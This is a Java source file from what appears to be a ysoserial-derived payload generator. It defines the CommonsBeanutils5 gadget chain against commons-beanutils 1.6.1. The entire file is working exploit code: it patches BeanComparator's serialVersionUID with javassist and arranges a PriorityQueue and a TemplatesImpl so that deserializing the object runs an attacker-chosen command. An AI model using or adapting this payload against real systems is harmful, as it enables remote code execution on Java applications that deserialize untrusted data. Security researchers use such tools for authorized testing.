package org.su18.ysuserial.payloads.gadgets;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.naming.CompositeName;
import java.lang.reflect.Constructor;
import java.util.PriorityQueue;

import static org.su18.ysuserial.payloads.config.Config.POOL;
import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.insertField;


@Dependencies({"commons-beanutils:commons-beanutils:1.6.1"})
public class CommonsBeanutils5 implements ObjectPayload<Object> {
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils5.class, args);
	}

	@Override
	public Object getObject(String command) throws Exception {
		final Object template;
		template = Gadgets.createTemplatesImpl(command);
		ClassPool pool    = ClassPool.getDefault();
		CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");

		insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = 2573799559215537819L;");

		Class                       beanCompareClazz = ctClass.toClass();
		BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
		final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");
		Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

		return queue;
	}
}
